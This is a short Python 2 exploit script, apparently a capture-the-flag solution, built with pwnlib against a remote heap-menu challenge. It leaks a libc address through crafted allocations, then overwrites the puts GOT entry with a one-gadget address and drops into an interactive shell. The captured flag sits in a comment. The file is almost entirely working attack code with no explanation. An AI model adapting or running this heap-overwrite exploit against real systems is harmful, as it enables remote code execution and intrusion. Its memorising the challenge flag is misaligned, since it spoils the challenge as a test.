from pwnlib import *

# flag{W33_g0t_H34p_me7ad4t4_!n_BSS}


#s = Socket(("localhost", 6767))
s = Socket(("202.120.7.194", 6666))
print s.ru(" 3. Exit\n\n")

def delete(n):
	print "deleting", n 
	s.send("2\n")
	s.send("%d\n" % n)
	s.ru(" 3. Exit\n\n")

def add(length, payload):
	print "adding", length
	s.send("1\n")
	s.send("%d\n" % length)
	s.send(payload + "\n")
	s.ru(" 3. Exit\n\n")


# leak, then return to a clean slate
def leak():
	add(10, "A"*0x810)
	add(20, "A"*0x810)
	add(30, "A"*0x810)
	add(40, "A"*0x810)
	add(50, "A"*0x810)

	add(2016, "A"*0x810)
	add(2015, "A"*0x810)
	add(2015, "A"*0x810)

	s.send("2\n")
	s.ru("5. ")

	leaked = uq(s.ru("6. ")[16:24])

	s.ru("o Delete?\n")
	s.send("42\n")
	s.ru(" 3. Exit\n\n")

	for i in range(8):
		delete(0)
	
	return leaked


leaked = leak()
libc_base = leaked - 0xd81030 + 0x9e000

print "libc: 0x%x" % libc_base
assert libc_base & 0xfff == 0



payload  = ""
payload += "AAAAAAAA"
payload += pq(0x100)
payload += pq(0x603260) # puts@got
#payload += pq(libc_base + 0xf0567) # local
payload += pq(libc_base + 0xd6e77) # remote
assert "\n" not in payload

payload += pattern(0x810 - len(payload))
assert len(payload) == 0x810

# found by random trying
sizes = [
	2006, 2011, 2027, 
]

for size in sizes:
	add(size, payload)


s.send("2\n")
s.ru("1. ")


s.interact()
